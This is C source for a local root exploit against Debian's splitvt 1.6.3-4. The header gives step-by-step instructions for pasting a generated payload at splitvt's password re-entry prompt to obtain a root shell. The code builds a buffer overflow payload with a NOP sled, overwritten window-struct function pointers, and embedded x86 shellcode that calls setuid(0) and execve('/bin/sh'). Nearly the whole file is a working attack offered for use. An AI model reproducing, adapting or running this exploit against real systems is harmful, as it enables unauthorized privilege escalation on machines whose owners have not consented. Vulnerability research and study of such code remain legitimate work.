/*
	Local exploit for Debian splitvt 1.6.3-4 - by Syzop
	
	Thanks to aleph1 for writing the article about
	buffer overflows in phrack 49 :).

	Greetz:	Terror, Scorpion, ^Stealth^, Jornx, Multani,
		and all other ppl of The^Alliance :)

How to use the exploit
-----------------------

1.	Use: ./splitexp >expcode to put the exploitcode into 'expcode'.
2.	Start splitvt
3.	Enter something like 'sleep 60; echo lalala'
4.	Ctrl+O, x, 'Enter password' bla
5.	Then splitvt says 'Re-enter password', this is the moment
	you have to follow the instructions in 'expcode' to paste
	the exploitcode to splitvt (don't press enter, see 6).
6.	Wait until the sleep is done (or kill 'sleep' yourself from
	_another_ terminal).
7.	You now got a rootshell,
	type 'reset' to get a normal terminal :).

IMPORTANT NOTES!!
------------------

NOTE 1:	You have to paste the data exactly, so just a paste with the mouse
	won't work since the shellcode also contains 08's (backspaces),
	So using mouse copy&paste in normal linux console mode doesn't work,
	I used windows with 'putty'

NOTE 2: If you ftp the exploit code to a windows box, be sure to transfer
	the file in ASCII mode :).

*/

#include <stdlib.h>
#include <stdio.h>

#define NOP		0x90

/*
	The shellcode: setuid(0); execve("/bin/sh",NULL); exit(0);.
	Pointer to /bin/sh is static, so filled with 0x90s here,
	will be changed to an address at runtime.
*/
char shellcode[] =
        "\x31\xc0\x50\x89\xc3\xb0\x17\xcd"
        "\x80\xbe\x90\x90\x90\x90\x89\x76"
        "\x08\x31\xc0\x88\x46\x07\x89\x46"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08"
        "\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
        "\xd8\x40\xcd\x80/bin/sh.";

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  char *pointerz;
  long *addr_ptr, addr;
  int i;

  long addr1=0x80592e4;		// pointer to the middle of our window-struct
  long addr2;			// pointer to position after 25% of the NOPs
  long addr3;			// pointer to '/bin/sh' string
 
  fprintf(stderr,"Splitvt exploit by Syzop\n\n");
  if (argc > 1) addr1  = atol(argv[1]);

  addr2=addr1+350;
  addr3=addr1+444;

  if (!(buff = malloc(1500))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }


  // set offset-to-/bin/sh in shellcode
  ptr = shellcode+10;
  addr_ptr = (long *) ptr;
    *(addr_ptr++) = addr3;

  // 0-300: the window struct
  // first filling with 0x40's
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < 300; i+=4)
    *(addr_ptr++) = 0x40404040;
  
  // set pointer to addr2 in curwin->process_char
  ptr = buff + 28;
  addr_ptr = (long *) ptr;
    *(addr_ptr++) = addr2;	// this is the pointer to addr2
    
  for (i = 300; i < 528; i++)		// 300-END	NOPs
    buff[i] = NOP;

  // 400-...:	shellcode
  ptr = buff + 400;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[528] = '\0';

  // Create the pointers-to-addr1-string.
  
  pointerz=(char *)malloc(1004);
  ptr = pointerz;
  addr_ptr = (long *) ptr;
  for (i = 0; i < 1000; i+=4)		// 0-300:	the window-structure
    *(addr_ptr++) = addr1;

  pointerz[1000]=0;
  printf("Paste this 1x:\n%s\n\nAnd this 12x:\n%s\n", buff, pointerz);
}
